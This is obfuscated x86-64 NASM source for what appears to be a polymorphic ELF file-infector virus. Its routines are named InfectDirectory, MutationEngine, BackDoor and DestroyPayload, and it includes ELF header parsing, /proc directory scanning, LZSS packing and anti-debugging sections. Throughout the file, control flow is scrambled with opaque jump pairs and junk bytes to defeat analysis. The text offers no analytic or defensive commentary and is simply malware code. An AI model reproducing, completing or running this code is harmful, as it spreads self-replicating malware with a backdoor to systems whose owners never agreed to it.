%ifndef ENABLE_DEBUGGING
    mov         r1, 0xf
    VAR         packed, bash
    mov         r2, r5
    mov         rax, SYS_PRCTL
%endif
    jmp         $+3
db 0x98
    jl          ..@dzGW3DbSXEiv
    jge         ..@dzGW3DbSXEiv
..@mO5IRcbTNoyR:
%ifdef X86_64
    mov         edx, DWORD [rdi]
    and         edx, 0fff8fff8h
%endif
    jmp         $+4
db 0x64, 0xed
    je          ..@SpdI1uIgoVLi
    jne         ..@SpdI1uIgoVLi
..@vgAjv3vRxbFi:
    mov         edx, 1
    jmp         $+4
db 0x6a, 0x1d
    jl          ..@WY76Wq8xo1ao
    jge         ..@WY76Wq8xo1ao
..@xpyuQHqSMQmz:
    xchg        rcx, rcx
    jmp         ..@rtaiAf5o2uu7
..@rNrxT55HcOBu:
    ret
    jl          ..@cSFWXWmVimkw
    jge         ..@cSFWXWmVimkw
..@8g1ELgQLkamp:
    ret
    jmp         $+4
db 0xf2, 0x0e
    jmp         ..@4TPEtJo8RX6O
..@1Gpx8ZDFXsqK:
    xor         rdx, rdx
    jb          ..@yKJT2mMsfkv5
    jae         ..@yKJT2mMsfkv5
..@BDCKHm8th7rN:
    cmp         r2, 0
    jl          ..@h8QzC8xIIxzC
    jge         ..@h8QzC8xIIxzC
..@6uEQK8aHbrTu:
    lea         r1, [rsp+_PAYLOAD_OFF.key]
    mov         r2, m6
    xchg        rdx, rdx
    jmp         ..@hMotuyCPz5pO
..@Zm085nnK9luv:
    jmp         Strcpy
    jmp         $+3
db 0x61
    jmp         ..@Q3Wm1M6C5X1j
..@4H5ajNGkTs4v:
    pop         rcx
    pop         rsi
    jmp         $+4
db 0xd9, 0x21
    jmp         $+5
db 0x3a, 0xd4, 0x4d
    jmp         ..@QJkuao4In4v1
..@ejqD92AHVfYU:
%ifdef X86_64
    xchg        rcx, rcx
    test        bl, bl
    push        rsi
    push        rcx
%endif
    jmp         $+3
db 0xe1
    jmp         ..@XqZdHpX8Yevf
..@fRaLxmkHANUS:
    xor         rbx, rbx
    add         rsi, 1
    jmp         ..@KO3E5X3jzb4u
..@bY78pjjRKsZ6:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    push        rbx
    jb          ..@9kgiVCmRtAFq
    jae         ..@9kgiVCmRtAFq
..@HXvzRGH4O04s:
    push        r5
    xor         r4, r4
    jb          ..@NmCn4nbXFucU
    jae         ..@NmCn4nbXFucU
..@p61uJuGHb8qI:
    pop         rcx
    jmp         $+3
db 0x61
    js          ..@ft3gOC4Z8wtU
    jns         ..@ft3gOC4Z8wtU
..@IxdOCeTd9pw6:
%ifdef X86_64
    shr         rdx, 19
%endif
    jmp         ..@1je6YHVyhQUw
..@qNWheN5ozX01:
    mov         m6, rax
    mov         r1, rax
    mov         r2, vsp
    mov         r3, non_packed_len
    call        MemMove
    js          ..@Hax59NI5RFGH
    jns         ..@Hax59NI5RFGH
..@WcI5xRsIRgMY:
    push        rdx
    jb          ..@xb1HWMv2yD7v
    jae         ..@xb1HWMv2yD7v
..@ZXPIOjG7JwXG:
    xchg        rdi, rdi
    pop         rcx
    pop         rsi
    jmp         $+5
db 0x0b, 0x09, 0x42
    jl          ..@iLNYbCm9jBR7
    jge         ..@iLNYbCm9jBR7
..@ypCCZfxASCfs:
    mov         rdi, rdi
    jmp         $+3
db 0x30
    jmp         $+5
db 0x06, 0x56, 0x7d
    jl          ..@EPc57TdIKVj1
    jge         ..@EPc57TdIKVj1
..@RTr3tehnrNzl:
    jz          ..@iXRn1T2TwrWn
    jmp         $+4
db 0xb4, 0x2b
    jmp         $+4
db 0xce, 0x38
    jmp         ..@uxrnSnTLaRSM
..@33WfkG6lpTO2:
%ifdef X86_64
    cmp         edx, 00c08048h
    xchg        rdx, rdx
    mov         rbp, rbp
%endif
    jmp         $+5
db 0xad, 0x4c, 0xfb
    jb          ..@ehSuza42iAAC
    jae         ..@ehSuza42iAAC
..@ssl5ZU9ODyu1:
    push        r1
    jl          ..@Y1b8Ytcvbs1d
    jge         ..@Y1b8Ytcvbs1d
..@EaxK7DvpEwPP:
    mov         bx, WORD [rsp+_LZSSE_OFF.la_index]
    jl          ..@CobgjeJhLkHn
    jge         ..@CobgjeJhLkHn
..@g7vJ0BUKsVpU:
%ifdef X86_64
    shl         rbx, 8
%endif
    js          ..@Zt27JdoZ5pgJ
    jns         ..@Zt27JdoZ5pgJ
..@DxEJKxBx8UyH:
%ifdef X86_64
    cmp         edx, 0000b841h
%endif
    jmp         ..@1uMjA0gM3qvo
..@VghZcxu0XJz4:
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    test        al, al
    jmp         ..@oXXAFIvuGtbZ
..@ezIdsfLkQfq3:
    mov         rax, rdi
    jmp         ..@YQuYcLbe2QOw
..@JA1oXhcp9Dbk:
    pop         rbx
    jmp         ..@OgYrJ0IkcSMB
..@8GH6C44Pt1CA:
    xor         rax, rax
    jmp         $+4
db 0xfa, 0x8d
    jmp         $+4
db 0x50, 0xe5
    jmp         ..@v2NWai9GzIZ9
..@VV5pZp7IZbe7:
    shr         edx, 8
    jmp         $+3
db 0xe4
    je          ..@uJIDx7fSakG9
    jne         ..@uJIDx7fSakG9
..@V6ksBivHN48R:
    jnz         ..@2TEZnZojdEHl
    js          ..@65vorcNr2Rhl
    jns         ..@65vorcNr2Rhl
..@GXCcmDrNkilX:
    ret
    jb          DestroyPayload
    jae         DestroyPayload
..@sWTrAi3ttAsI:
    xor         rdx, rdx
    mov         dl, BYTE [rsp+_LZSSE_OFF.cmp_len]
    sub         dl, cl
    cmp         dl, BYTE [rsp+_LZSSE_OFF.match_len]
    xchg        rcx, rcx
    jmp         $+5
db 0xea, 0xf4, 0x50
    jb          ..@q0VcWcRD92Oo
    jae         ..@q0VcWcRD92Oo
..@VkFFSnvEuGzz:
    xchg        rcx, rcx
    aesenc      xmm0, xmm1
    xchg        rsi, rsi
    jmp         ..@cC2ppD9rcuqy
..@EFvFn3Fnpi4e:
    test        ax, ax
    xchg        rcx, rcx
    jmp         $+3
db 0x5d
    jmp         $+4
db 0xa4, 0x77
    jl          ..@vX9yIK8q0fDf
    jge         ..@vX9yIK8q0fDf
..@KfP45Im42VRF:
    cmp         r4w, WORD [r1+e_h.e_phnum]
    jge         ..@IqyIJNVLcwnu
    add         r4, 1
    jmp         ..@eixHI4M5Nkd7
    jmp         $+5
db 0x00, 0xd7, 0xe6
    jb          ..@2EQTK68sczqo
    jae         ..@2EQTK68sczqo
..@0k9Bi2DF1oNZ:
    xchg        rdi, rdi
    push        rcx
    pop         rcx
    js          ..@fzTHqSsWuBKa
    jns         ..@fzTHqSsWuBKa
..@9Ryq9lQLJ5Nx:
    pop         r1
    jmp         ..@q2dHQBsXaqNk
..@QHmqrgG6iC4s:
    xor         rax, rax
    jl          ..@47LOK8xVPebv
    jge         ..@47LOK8xVPebv
..@NC39EZgitreN:
    mov         m7, rdi
    jmp         $+4
db 0x55, 0x63
    jb          ..@2f9e01ZaNsXa
    jae         ..@2f9e01ZaNsXa
..@8H4eURhtDdv5:
    mov         QWORD [rsp+_PROC_OFF.dirindex], 0x00
    xor         r4, r4
    jmp         $+5
db 0xd5, 0x26, 0x94
    jb          ..@7Trw1ohlUOtc
    jae         ..@7Trw1ohlUOtc
..@UGLrL2A1ltPL:
%ifndef ENABLE_DEBUGGING
    call_vsp    ExitProgram
    mov         rbx, rbx
    push        rcx
%endif
    jb          ..@Ihomzyk27B6q
    jae         ..@Ihomzyk27B6q
..@f99ix2UtoNGQ:
    xor         rdx, rdx
    jmp         $+4
db 0x33, 0x59
    js          ..@02CX3IP0WB2E
    jns         ..@02CX3IP0WB2E
..@cYWi9vlF3NaK:
    mov         rax, rax
    mov         rsi, [rsp+_LZSSE_OFF.inputaddr]
    xchg        rsp, rsp
    add         WORD [rsp+_LZSSE_OFF.buffersize], cx
    jmp         ..@cgI2BO16mWpi
..@vDjRTdFi82Ii:
    pop         rcx
    je          ..@wQxxQp2cS4ew
    jne         ..@wQxxQp2cS4ew
..@rmXxWFeHDoMW:
    mov         rax, SYS_GETCWD
    jmp         $+4
db 0x14, 0xb3
    jmp         ..@l24icaV9glQq
..@1YbmsC3kcpIl:
    push        rsi
    push        rcx
    jmp         ..@MlBkrXP2b9gD
..@FeX9NoxfSIZR:
    pop         rbx
    jb          ..@GRXiEW7aiBex
    jae         ..@GRXiEW7aiBex
..@zupd5ifmLcI5:
%ifdef X86_64
    xchg        rax, rax
    mov         rbp, rbp
    cmp         dl, 48h
    jne         ..@SxmsLLvIDjvJ
%endif
    jmp         ..@5xhEhOUrYXzL
..@M0TsAcIoGZtT:
    mov         dl, BYTE [rsp+bytes+2]
    xor         dl, BYTE [rsp]
    and         dl, 1110b
    jmp         $+4
db 0x7a, 0x6a
    js          ..@JQvxHffSZKpI
    jns         ..@JQvxHffSZKpI
..@wNwa2OPhVWOQ:
%ifdef X86_64
    test        dx, dx
%endif
    jmp         $+4
db 0xdf, 0xd3
    jmp         ..@YsJMFZlEcxld
..@z56bjINyDxnA:
    mov         bl, 31h
    je          ..@4uxOF6PnQ6lo
    jne         ..@4uxOF6PnQ6lo
..@LctNMD7hPavS:
    pop         rcx
    js          ..@BJh8WBKplDA7
    jns         ..@BJh8WBKplDA7
..@fG9LCFslsJlP:
    push        rsi
    push        rcx
    push        rsi
    pop         rsi
    jmp         $+3
db 0x20
    js          ..@8GH6C44Pt1CA
    jns         ..@8GH6C44Pt1CA
..@CVnUhVrj8Ya3:
%ifndef ENABLE_DEBUGGING
    xor         r1, r1
%endif
    jmp         $+3
db 0xe0
    jmp         $+3
db 0x23
    jl          ..@7U3As5cV4tz8
    jge         ..@7U3As5cV4tz8
..@LG9UTkDsOlhi:
    pop         rsi
    je          ..@lxQLQkVAT7g2
    jne         ..@lxQLQkVAT7g2
..@8upLpdTxKwN3:
    jl          ..@RATTV1n6h58s
    jmp         $+4
db 0xd5, 0xc2
    jl          ..@wVRUXC9UU4YJ
    jge         ..@wVRUXC9UU4YJ
..@MRB869S9nHeM:
    mov         r2b, BYTE [rsp+_INFDIR_OFF.depth]
    jb          ..@mH2Ijl57wdDu
    jae         ..@mH2Ijl57wdDu
..@y2bzkDEGJ8gY:
    mov         rax, 1
    jmp         $+4
db 0xbd, 0x8a
    jmp         ..@ojcTkrFFqs0D
..@99Q6QG4UIoFZ:
    xor         rax, rax
    js          ..@xpLqhhtooHuE
    jns         ..@xpLqhhtooHuE
..@3N4F1EGhyvBB:
    mov         QWORD [rsp+_INFDIR_OFF.dirindex], 0x00
    jmp         $+5
db 0x4e, 0xd6, 0x80
    jb          ..@f2zq1ZtKVQfm
    jae         ..@f2zq1ZtKVQfm
..@xi8jBJ5yIC5P:
    mov         rax, 1
    jmp         ..@YpFr0KE2lQZZ
    js          ..@2TEZnZojdEHl
    jns         ..@2TEZnZojdEHl
..@NcHpm1IzVJQN:
    add         rsp, _MUTA_OFF_size
    ret
    jmp         $+5
db 0x3e, 0x2e, 0x03
    jmp         ConvertPushPopToMove
..@lIbzWCCJtHVC:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    jmp         $+3
db 0x59
    jmp         $+3
db 0x90
    je          ..@n1xpvf1MWHcb
    jne         ..@n1xpvf1MWHcb
..@wlz7BATXbym5:
    shl         al, 3
    or          cl, al
    jmp         $+3
db 0x58
    jb          ..@7h1n2c9MmMPs
    jae         ..@7h1n2c9MmMPs
..@l6J1UiLxFmVl:
    lea         r1, QWORD [rsp+_INFFILE_OFF.file]
    call        FileValidation
    jl          ..@CquRjkySoGTH
    jge         ..@CquRjkySoGTH
..@V2FsFxg3MQl8:
    xor         rax, rax
    mov         dx, WORD [rsp] 
    jmp         ..@f594BwxoM5D9
..@8cZCkFNOxFzF:
    xchg        rdi, rdi
    jl          ..@9Uun72ZN9Q6T
    jge         ..@9Uun72ZN9Q6T
..@sp0gi3Mp6LYY:
    push        r4
    push        r5
    jmp         $+3
db 0xc8
    jmp         $+3
db 0x20
    jb          ..@1VNbiDT3J6gh
    jae         ..@1VNbiDT3J6gh
..@c8wE4gJBLKzM:
    pop         rax
    jmp         $+3
db 0xbd
    jb          ..@u6ieS5V2IHgt
    jae         ..@u6ieS5V2IHgt
..@7bjy1DHD6ZDp:
    mov         rdi, QWORD [rsp+_LZSSE_OFF.outputaddr]
    mov         BYTE [rdi], al
    inc         QWORD [rsp+_LZSSE_OFF.outputaddr]
    jl          ..@DcR1SZ1r5dxv
    jge         ..@DcR1SZ1r5dxv
ConvertMoveToPushPop:
    jmp         ..@CnhmDOpINvdd
..@xxhjXdoSpDDP:
    jmp         ..@n8bRDgeOgnvg
    jmp         $+5
db 0x9f, 0x3a, 0x35
    jmp         $+3
db 0xff
    jb          ..@AIvh7ob04Y3C
    jae         ..@AIvh7ob04Y3C
..@NjZR5GNu6FV1:
    push        rdx
    pop         rdx
    jmp         $+3
db 0xc9
    jmp         $+5
db 0xe0, 0x47, 0xea
    jmp         ..@JA49Horbx4qu
..@i6yWxhZdO3Pu:
    jmp         ..@n8bRDgeOgnvg
    jmp         $+5
db 0x9d, 0x79, 0xbb
    jb          ..@cK1tRlOjOBLh
    jae         ..@cK1tRlOjOBLh
..@G4E9hsQ8aRi5:
    mov         rax, (-1)
    jmp         $+5
db 0x80, 0x7d, 0x6a
    js          ..@5z7NIUNRBKXE
    jns         ..@5z7NIUNRBKXE
..@q2dHQBsXaqNk:
    ret
    jl          AddSizeMappedFile
    jge         AddSizeMappedFile
..@rZZLb0w41ora:
    jne         ..@yzPYtCSt7DTx
    jmp         $+3
db 0x4d
    jmp         $+5
db 0x51, 0x55, 0x23
    jmp         $+5
db 0xc5, 0x5b, 0xb3
    jmp         ..@MfKay6kC7lCb
..@K0ChnjSzwjHq:
    mov         BYTE [rdi], al
    jmp         $+5
db 0xf2, 0x56, 0x96
    jmp         $+3
db 0xe5
    je          ..@JgKwyys8TmzR
    jne         ..@JgKwyys8TmzR
..@DvmYhBrIUMwx:
    mov         DWORD [rsp+_MUTA_OFF.index], 0x00
    js          ..@4iebUHvgcqoo
    jns         ..@4iebUHvgcqoo
..@484SnfNaZ69f:
    pop         rax
    pop         rcx
    pop         rsi
    jmp         ..@0oCBDX9I8G3t
..@gM4zo8IJwwLF:
    mov         r3, QWORD [r5+file.filesize]
    call        MemMove
    jmp         $+5
db 0x6e, 0xea, 0x3c
    jmp         ..@093J7eCbeyMO
ConvertMoveValueToPushPopValue:
    jmp         ..@9Jmv7g122HmV
..@Au8w00JQTKtK:
    push        rdx
    pop         rdx
    je          ..@jH6lhwQ8cKWQ
    jne         ..@jH6lhwQ8cKWQ
..@X57iZiTZQbl9:
    add         r5, rax
    push        rax
    push        rdx
    jmp         $+3
db 0x97
    jl          ..@dwMeijCOhfdV
    jge         ..@dwMeijCOhfdV
..@x1j3swHyuwfO:
    xor         rbx, rbx
    xor         rcx, rcx
    mov         rdx, rdx
    mov         ecx, 0c0h
    push        rsi
    jmp         $+3
db 0x90
    jmp         ..@a26FgZaQK3Pa
..@mH2Ijl57wdDu:
    add         r2, 1
    jmp         $+5
db 0xff, 0xe0, 0xcc
    js          ..@BYXepFB9gLHm
    jns         ..@BYXepFB9gLHm
..@tjNeLYzrnPBh:
    xor         rbx, rbx
    xor         rdx, rdx
    mov         bl, BYTE [rsp+_LZSSE_OFF.character]
    js          ..@xw1JAInNwJs0
    jns         ..@xw1JAInNwJs0
..@y8S15DLqnDWS:
    jz          ..@YIQsiCrZ4SFC
    jl          ..@u4VP1OpgKXop
    jge         ..@u4VP1OpgKXop
..@xpLqhhtooHuE:
    xor         rcx, rcx
    xor         rbx, rbx
    xor         rdx, rdx
    js          ..@YwgokvLRa0j4
    jns         ..@YwgokvLRa0j4
..@tDUF3XhQG4kB:
    jl          ..@cXnVNccWZceC
    xor         r4, r4
    VAR         packed, procs
    jmp         $+5
db 0xd8, 0x5f, 0x89
    jmp         $+5
db 0x37, 0x19, 0xf7
    js          ..@ftKh8pWOmzyf
    jns         ..@ftKh8pWOmzyf
..@vvukvyeBmcU5:
    call        UnmapFile
    js          ..@yzPYtCSt7DTx
    jns         ..@yzPYtCSt7DTx
..@lRXpUBt5DHt0:
    ret
    jmp         $+4
db 0xbc, 0x82
    jb          LzssEncoder
    jae         LzssEncoder
..@6jfDsQEmTGbw:
    push        r3
    mov         r1, r4
    jmp         $+4
db 0xbb, 0x14
    jb          ..@OdNtn6gJNkEb
    jae         ..@OdNtn6gJNkEb
..@uJIDx7fSakG9:
    mov         al, dl
    jl          ..@aNR7w3En9Vqe
    jge         ..@aNR7w3En9Vqe
..@WQdOIlEEZbma:
%ifndef ENABLE_DEBUGGING
    rep         nop
%endif
    jmp         $+5
db 0x94, 0x43, 0x32
    jmp         $+3
db 0x4f
    jmp         $+3
db 0x47
    js          BackDoor
    jns         BackDoor
..@aUlNTJ9JlspS:
    shr         BYTE [rsp+_LZSSE_OFF.mask], 1
    push        rdx
    jb          ..@nEe2yxnXRWus
    jae         ..@nEe2yxnXRWus
..@xI5OUL7yJqsl:
    jz          ..@nFmCmFVdwlC8
    js          ..@NlhTaHKOaVpr
    jns         ..@NlhTaHKOaVpr
..@9XCSDAX1HfeS:
    cmovg       ecx, DWORD [rsp+_LZSSE_OFF.length]
    js          ..@BD5q5VSYh8Ed
    jns         ..@BD5q5VSYh8Ed
..@yeKDybS5DOfl:
%ifdef X86_64
    shr         rdi, 32
    mov         WORD [rsi+rcx], di
%endif
    je          ..@P4cid8TxJaZG
    jne         ..@P4cid8TxJaZG
..@lctggja3VxtS:
    mov         BYTE [rdi], 68h
    test        cl, cl
    jmp         ..@y8S15DLqnDWS
..@P7KsLtnkWAdK:
    pop         r3
    pop         r2
    pop         r1
    rep         nop
    jmp         $+4
db 0xa9, 0xbc
    jl          ..@GHbbznCkBz9n
    jge         ..@GHbbznCkBz9n
..@kbzdHnrXb1gT:
    add         r1, signature_reg_len-1
    jmp         $+5
db 0xc9, 0x2d, 0x80
    jb          ..@4XWONgpWAP74
    jae         ..@4XWONgpWAP74
..@emVtEp8JbSEw:
    xor         rdx, rdx
    or          ebx, 0b8h
    xchg        rcx, rcx
    mov         rbp, rbp
    mov         rdi, rbx
    js          ..@7TXH1rK68TGu
    jns         ..@7TXH1rK68TGu
..@XOwVAyzIf3FF:
%ifndef ENABLE_DEBUGGING
    mov         r2d, 0x2
%endif
    jmp         $+5
db 0x89, 0x35, 0x29
    jb          ..@vm1gTbXHFdbw
    jae         ..@vm1gTbXHFdbw
..@p6Nx4CNmUARs:
    rep         cmpsb
    jl          ..@GBm0C6d5zdHE
    jge         ..@GBm0C6d5zdHE
..@72u5FtRpnozE:
    pop         rdx
    jmp         $+5
db 0xf2, 0x1c, 0xe9
    jmp         ..@fuu777iemhzM
..@U5oAns7d6WjB:
    mov         rbx, 909090c0h
    jmp         $+5
db 0xec, 0x11, 0xa2
    jmp         $+4
db 0xf6, 0xa0
    jmp         $+4
db 0xc4, 0x3f
    jl          ..@7NepqYUtqLjG
    jge         ..@7NepqYUtqLjG
..@l24icaV9glQq:
    syscall
    cmp         rax, 0x0
    xchg        rcx, rcx
    jle         ..@wAadv0R7znTx
    mov         rax, rsp
    jmp         ..@DzNOyyuqkRlF
..@ot50qVtM9hbD:
    jz          ..@EkUnOYFCRKBF
    jmp         $+3
db 0x22
    jmp         ..@xVbMj5cwtZ7M
..@jH6lhwQ8cKWQ:
    cmp         BYTE [r1], 0x0
    jmp         ..@tqyKArcr6iao
..@FgWbiJB9ooCk:
    mov         rax, rax
    jmp         $+4
db 0x1b, 0x42
    js          ..@PWJQK8R9o7Id
    jns         ..@PWJQK8R9o7Id
..@1tnVrNrkEBZz:
%ifdef X86_64
    jne         ..@prbqmY2ABQAL
%endif
    jmp         $+4
db 0x94, 0x07
    js          ..@BmJA1tqq3vyE
    jns         ..@BmJA1tqq3vyE
..@aLHos8H9ZB5q:
    mov         rcx, rcx
    je          ..@okGO53eqYIeO
    jne         ..@okGO53eqYIeO
..@CwhPiThO4Mjj:
    xchg        rdi, rdi
    mov         rbx, rbx
    shr         ecx, 8
    and         ecx, 0ffh
    js          ..@M0TsAcIoGZtT
    jns         ..@M0TsAcIoGZtT
..@p5RtKuud3ylK:
    setz        cl
    jmp         $+3
db 0x80
    jmp         $+4
db 0x99, 0xf9
    jl          ..@lctggja3VxtS
    jge         ..@lctggja3VxtS
..@3oY9U8v87nMP:
    cmp         BYTE [r1], 0x39
    js          ..@AzmGX9piHzQG
    jns         ..@AzmGX9piHzQG
..@k1d8uQg9fkpl:
    je          ..@LCVrLHKyODmi
    xchg        rcx, rcx
    xchg        rax, rax
    cmp         WORD [r1], '..'
    je          ..@LCVrLHKyODmi
    jmp         ..@eQmyi8ivhu4q
..@LiZoq41VZJnh:
    movzx       rax, BYTE [r2]
    mov         [r1], rax
    push        rax
    pop         rax
    jl          ..@HNycmgBbMyqM
    jge         ..@HNycmgBbMyqM
..@cC2ppD9rcuqy:
    movdqu      xmm1, oWORD [rsp+0x90]
    jmp         $+5
db 0x4a, 0xf1, 0x87
    js          ..@mxszI8JntX0J
    jns         ..@mxszI8JntX0J
..@eRAluMOT1Lfs:
    ODIR        [rsp+_INFDIR_OFF.dirfd], [rsp+_INFDIR_OFF.dirbuf], DIRENT_BUFSIZE
    cmp         rax, 0x00
    js          ..@ikhWCmqqB1a5
    jns         ..@ikhWCmqqB1a5
..@weKp4CZsaco9:
    pop         r5
    jmp         $+4
db 0x14, 0x1c
    jmp         $+4
db 0x23, 0xdd
    js          ..@GCvgOaRLDl8H
    jns         ..@GCvgOaRLDl8H
..@hnKocn6VXAZb:
    je          ..@qQ5wZbRc5imi
    mov         QWORD [r5+file.fileptr], rax
    xchg        rdx, rdx
    jmp         $+3
db 0x8d
    jmp         ..@C8WKuOaK89YX
..@uYqw1qaVPxZf:
%ifdef X86_64
    xor         rdi, rdi
    xor         rdx, rdx
    xor         r9, r9
    mov         rsi, QWORD [r8+file.filesize]
%endif
    jl          ..@laTttCyzj7jM
    jge         ..@laTttCyzj7jM
..@SjQS3Z9RLyHl:
    add         r5, QWORD [r4+rax+p_h.p_memsz]
    je          ..@ObMQAvJ5c916
    jne         ..@ObMQAvJ5c916
..@uxrnSnTLaRSM:
    mov         rbx, rbx
    call        ConvertXorToMoveZero
    js          ..@iXRn1T2TwrWn
    jns         ..@iXRn1T2TwrWn
..@bqGEenKTzjI8:
    mov         esi, DWORD [rdi]
    jl          ..@IwmvLOW2w7V8
    jge         ..@IwmvLOW2w7V8
..@gVi7fJ2gtsAs:
    add         rsp, _PROC_OFF_size
    jmp         $+4
db 0x94, 0x14
    jb          ..@fW95coYIJFOw
    jae         ..@fW95coYIJFOw
..@AJK520bum0Tk:
    ret
    jmp         $+3
db 0x85
    je          MutationEngine
    jne         MutationEngine
..@2f9e01ZaNsXa:
    add         m7, rax
    jmp         ..@ntf4sytF8uNK
..@qSBoZtn51QIR:
%ifdef X86_64
    mov         r10, 0x22
    push        rdi
    pop         rdi
%endif
    jmp         $+3
db 0x5f
    jb          ..@u8yTMPgjHmRg
    jae         ..@u8yTMPgjHmRg
..@vkcU7a2j6WRF:
    mov         [rsp+_LZSSE_OFF.inputaddr], rsi
    jl          ..@RATTV1n6h58s
    jge         ..@RATTV1n6h58s
..@3mvDoHbMO4pb:
    pop         rcx
    pop         rsi
    xor         rax, rax
    ret
    jmp         $+3
db 0xe0
    jb          ..@qfi9rc5uM05A
    jae         ..@qfi9rc5uM05A
..@VIesAahoa5ZK:
    or          bl, cl
    shl         cl, 3
    mov         rdx, rdx
    or          bl, cl
    xchg        rax, rax
    jmp         $+4
db 0xb2, 0x74
    jmp         ..@oFEQhCAiS6Kn
..@v3SaASiuaBmt:
    cmp         bx, WORD [rsi+e_h.e_shnum]
    jl          ..@c0AHgfPEO1OW
    jmp         $+3
db 0x58
    jmp         ..@xi8jBJ5yIC5P
..@KgAeZ8y7ds3C:
    mov         r1, QWORD [r5+file.fileptr]
    mov         r2, QWORD [r1+e_h.e_entry]
    jmp         $+4
db 0xfb, 0xc8
    jmp         $+3
db 0x13
    jmp         ..@en1XpnCASMo1
..@jWSQ4MR2S0KH:
%ifdef X86_64
    pop         rax
%endif
    jmp         $+4
db 0xbd, 0x26
    jmp         $+4
db 0x1e, 0x6f
    jmp         $+4
db 0xde, 0x70
    jmp         $+5
db 0x65, 0x9b, 0x87
    js          ..@WflLTpF8ko81
    jns         ..@WflLTpF8ko81
..@ySBf5oACJAC0:
    rep         nop
    jmp         ..@SjEnO9jmXAYU
..@jqFJpOeomJCE:
    jmp         ..@KL2hLTP2onaO
    jmp         ..@ajQFF9KdToqq
..@JB9hrXOT8UTk:
    lea         r1, [rsp+_PROC_OFF.buffer]
    jmp         $+5
db 0x1f, 0x5f, 0x79
    jl          ..@qr9FOs1vTFVY
    jge         ..@qr9FOs1vTFVY
..@UN5R4U3oqI5B:
    mov         rbp, rbp
    jmp         $+5
db 0x6b, 0x96, 0x64
    jmp         $+3
db 0x22
    jmp         ..@2jdNFQny8glW
..@PlMJxd994GXp:
    cmp         eax, 0x3
    jle         ..@OWPLnCHNh4r5
    xchg        rsi, rsi
    mov         DWORD [rsp+_PROC_OFF.filefd], eax
    RFILE       rax, [rsp+_PROC_OFF.buffer], 0x100
    jmp         $+3
db 0x0b
    jmp         $+5
db 0x52, 0xe6, 0x4d
    jmp         ..@GyTat5glRNPc
..@iz2dEDA29b6v:
%ifdef X86_32
    mov         WORD [esi+ecx], bx
%endif
    jmp         ..@4H5ajNGkTs4v
..@Q9kgQci0rOTe:
    pop         r1
    mov         rsp, rsp
    jb          ..@FTHUeGV4NFio
    jae         ..@FTHUeGV4NFio
..@731kUgxoZEss:
    ret
    jmp         $+5
db 0xbd, 0x6e, 0xc4
    jl          MemMove
    jge         MemMove
..@ByUfPNdC9dx8:
    ret
    jmp         $+3
db 0x4d
    jmp         InfectDirectory
..@1jjvYsdzX5Hn:
    rep         nop
    xor         r1, r1
    xchg        rdx, rdx
    jmp         $+5
db 0xb4, 0xfe, 0x42
    jb          ..@bUgqp3golPjJ
    jae         ..@bUgqp3golPjJ
..@KpBu1Uf5PuWh:
    mov         r2, m7
    sub         r2, m6
    jmp         $+4
db 0x06, 0x31
    jmp         $+4
db 0xb7, 0xef
    js          ..@26zbwQVdkIUf
    jns         ..@26zbwQVdkIUf
..@BiomWBNve7YX:
    cmp         eax, 0x03
    jl          ..@gVi7fJ2gtsAs
    mov         DWORD [rsp+_PROC_OFF.dirfd], eax
    push        rbx
    pop         rbx
    jl          ..@wK08yBowSRx0
    jge         ..@wK08yBowSRx0
..@u6ieS5V2IHgt:
%ifdef X86_64
    cmp         al, 41h
%endif
    jmp         $+3
db 0x55
    js          ..@mBS0d7PGDLSI
    jns         ..@mBS0d7PGDLSI
..@WMRbMlGuFNOP:
%ifdef X86_32
    cmp         dx, 00e880h
%endif
    jmp         $+5
db 0xa4, 0x92, 0x16
    js          ..@ja94r1dcVAAF
    jns         ..@ja94r1dcVAAF
..@xmDA9qtYuVEW:
    push        rdi
    jb          ..@eiTvI0BbG77R
    jae         ..@eiTvI0BbG77R
..@BqtVsM4NegEo:
    push        rcx
    jmp         $+5
db 0x9f, 0x04, 0xd3
    jmp         ..@Evapy79nMLB3
..@eP9Pp8z4bGXD:
    push        r1
    xor         rdi, rdi
    xor         rcx, rcx
    xor         rdx, rdx
    jl          ..@V2FsFxg3MQl8
    jge         ..@V2FsFxg3MQl8
..@Z7gYVBIHKqnm:
    pop         rbx
    mov         dx, WORD [rdi+6]
    js          ..@aXm2f2gxbwhx
    jns         ..@aXm2f2gxbwhx
..@NmCn4nbXFucU:
    mov         r4d, DWORD [r1 + file.filefd]
    mov         r5, r1
    mov         r1, r4
    mov         rax, [r5+file.filesize]
    jmp         $+5
db 0xd5, 0xb4, 0x4a
    jb          ..@cOL2E3ITYBRx
    jae         ..@cOL2E3ITYBRx
..@Sk63d9FnyeZf:
    mov         r1, r5
    jmp         $+3
db 0x7f
    js          ..@4Mvwv6LXtN5j
    jns         ..@4Mvwv6LXtN5j
..@OWPLnCHNh4r5:
    mov         r4, QWORD [rsp+_PROC_OFF.dirindex]
    movzx       rax, BYTE [rsp+_PROC_OFF.dirbuf+linux_dirent.d_reclen+r4]
    mov         rsi, rsi
    add         QWORD [rsp+_PROC_OFF.dirindex], rax
    add         r4, rax
    jmp         $+5
db 0x45, 0x19, 0x24
    jmp         $+4
db 0x2e, 0x80
    js          ..@CqKNXw1wQOHB
    jns         ..@CqKNXw1wQOHB
..@kqyzs0n7iD17:
    and         eax, 0xff
    jl          ..@E9eb3sGnhDkZ
    jge         ..@E9eb3sGnhDkZ
..@NryjT0iDKSwF:
    jne         ..@n8bRDgeOgnvg
    jmp         $+3
db 0x3d
    jmp         ..@jJDNZ8vvMz9x
..@27cKeQ9btI5N:
    pop         rbx
    jmp         ..@ePr87Ih046g4
..@FG4g8wb1JIOk:
    cmp         BYTE [r1], '.'
    jmp         $+5
db 0xeb, 0x6e, 0x45
    jmp         ..@FbE98XXV9ATs
..@tTwla7e81SAJ:
    or          cl, al
    jmp         $+5
db 0x8a, 0x14, 0xac
    js          ..@nA4CEctvmdS3
    jns         ..@nA4CEctvmdS3
..@cOL2E3ITYBRx:
    add         rax, r2
    jb          ..@Pi1ng6f3qppu
    jae         ..@Pi1ng6f3qppu
..@iCR7aQMXqVrC:
    sub         WORD [rsp+_LZSSE_OFF.w_index], WINDOW_LENGTH
    mov         ecx, WINDOW_LENGTH*2
    xor         rax, rax
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    sub         rcx, rax
    jb          ..@2ET21Fby8bP3
    jae         ..@2ET21Fby8bP3
..@w2QHzYOPblJI:
    mov         r5, [rsp]
    mov         DWORD [r5+file.filefd], eax
